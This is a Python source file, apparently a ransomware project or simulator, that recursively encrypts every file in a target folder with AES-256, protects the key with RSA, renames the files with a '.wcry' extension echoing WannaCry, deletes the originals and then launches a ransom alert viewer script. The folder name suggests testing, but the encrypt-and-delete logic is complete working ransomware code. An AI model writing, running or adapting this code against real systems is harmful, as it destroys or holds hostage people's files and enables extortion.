import os
import sys
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.backends import default_backend
from dotenv import load_dotenv

# Get the parent directory of 'encryptor' (where .env, key, AlertViewer.py are located)
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))

# Load .env file correctly
env_path = os.path.join(BASE_DIR, ".env")
if os.path.exists(env_path):
    load_dotenv(env_path)
else:
    print(f"Warning: .env file not found at {env_path}")

class Encryptor:
    def __init__(self, folder_path):
        # Use provided folder or default
        self.folder_path = folder_path or os.path.join(BASE_DIR, "files")

        # Adjust key folder path (outside encryptor)
        self.key_folder = os.path.join(BASE_DIR, "key")

        # Ensure the key folder exists
        os.makedirs(self.key_folder, exist_ok=True)

        self.rsa_private_key_file = os.path.join(self.key_folder, "private_key.pem")
        self.rsa_public_key_file = os.path.join(self.key_folder, "public_key.pem")
        self.encrypted_aes_key_file = os.path.join(self.key_folder, "encrypted_aes_key.bin")

        # Generate RSA key pair if missing
        if not os.path.exists(self.rsa_private_key_file) or not os.path.exists(self.rsa_public_key_file):
            self.generate_rsa_keys()

    def generate_rsa_keys(self):
        """Generate an RSA key pair and save them as private_key.pem and public_key.pem."""
        print("Generating RSA key pair...")

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        public_key = private_key.public_key()

        # Save private key
        with open(self.rsa_private_key_file, "wb") as priv_file:
            priv_file.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

        # Save public key
        with open(self.rsa_public_key_file, "wb") as pub_file:
            pub_file.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))

        print(f"RSA key pair generated:\n- Private Key: {self.rsa_private_key_file}\n- Public Key: {self.rsa_public_key_file}")

    def generate_aes_key(self):
        """Generate a random AES key (32 bytes for AES-256)."""
        return os.urandom(32)

    def encrypt_aes_key(self, aes_key):
        """Encrypt the AES key using the RSA public key."""
        try:
            with open(self.rsa_public_key_file, "rb") as pub_file:
                public_key = serialization.load_pem_public_key(
                    pub_file.read(), backend=default_backend()
                )

            encrypted_aes_key = public_key.encrypt(
                aes_key,
                rsa_padding.OAEP(
                    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            with open(self.encrypted_aes_key_file, "wb") as enc_key_file:
                enc_key_file.write(encrypted_aes_key)

            print(f"AES key encrypted and saved to {self.encrypted_aes_key_file}")
        except Exception as e:
            print(f"Error encrypting AES key: {e}")

    def encrypt_file(self, file_path, aes_key):
        """Encrypt the file at file_path and append a .wcry extension."""
        try:
            with open(file_path, "rb") as file:
                file_data = file.read()

            # Generate a random IV (16 bytes for AES)
            iv = os.urandom(16)

            # Create AES cipher in CBC mode with the provided AES key and IV
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()

            # Apply PKCS7 padding (block size 128 bits = 16 bytes)
            padder = sym_padding.PKCS7(128).padder()
            padded_data = padder.update(file_data) + padder.finalize()

            # Encrypt the padded data
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()

            # Write the IV followed by the ciphertext to the new file
            encrypted_filepath = file_path + ".wcry"
            with open(encrypted_filepath, "wb") as enc_file:
                enc_file.write(iv + ciphertext)

            # Remove the original file
            os.remove(file_path)
            print(f"File '{file_path}' encrypted successfully to '{encrypted_filepath}'.")
        except Exception as e:
            print(f"Error during encryption of file {file_path}: {e}")

    def encrypt_all_files(self):
        """Encrypt all files in the target folder (skip files already encrypted)."""
        try:
            aes_key = self.generate_aes_key()  # Generate a new AES key
            self.encrypt_aes_key(aes_key)       # Encrypt and store the AES key

            # Walk through all files in the folder and encrypt those not ending with .wcry
            for root, _, files in os.walk(self.folder_path):
                for file in files:
                    if not file.endswith(".wcry"):
                        file_path = os.path.join(root, file)
                        self.encrypt_file(file_path, aes_key)

            # Run AlertViewer.py only if it exists (outside encryptor folder)
            alert_viewer_path = os.path.join(BASE_DIR, "AlertViewer.py")
            if os.path.exists(alert_viewer_path):
                subprocess.run(["python", alert_viewer_path])
        except Exception as e:
            print(f"Encryption process failed: {e}")

# Usage example
if __name__ == "__main__":
    target_folder = os.path.join(BASE_DIR, "C:/Users/undak/Documents/testingfiles/testingfiles")  # Set folder to encrypt
    encryptor = Encryptor(target_folder)
    encryptor.encrypt_all_files()
